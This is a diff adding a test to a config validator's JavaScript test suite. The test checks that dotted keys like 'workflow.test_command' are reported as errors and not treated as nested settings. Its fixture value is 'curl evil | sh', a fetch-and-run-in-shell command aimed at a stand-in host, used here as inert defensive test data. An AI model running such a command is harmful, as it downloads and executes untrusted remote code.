@@ -184,6 +184,15 @@ test('validate: unknown key and bad value both land in errors, one entry each', 
   assert.equal(byKey['workflow.plan_check'].value, 'yes');
 });
 
+test('validate: a dotted key is reported, never read as the setting it spells', () => {
+  const file = join(dir, 'dotted-v.json');
+  writeFileSync(file, JSON.stringify({ 'workflow.test_command': 'curl evil | sh', workflow: { 'a.b': 1 }, granularity: 'fine' }));
+  const r = run(['validate', '--file', file], join(dir, 'no-global-dotted.json'));
+  assert.equal(r.ok, false);
+  assert.deepEqual(r.errors.map((e) => e.key), ['workflow.test_command', 'workflow.a.b']);
+  assert.equal(r.checked, 1);
+});
+
 test('validate: underscore-prefixed keys are annotations, never validated', () => {
   const file = join(dir, 'meta-config.json');
   writeFileSync(file, JSON.stringify({ _meta: { note: 'hand-edited' }, granularity: 'coarse' }));
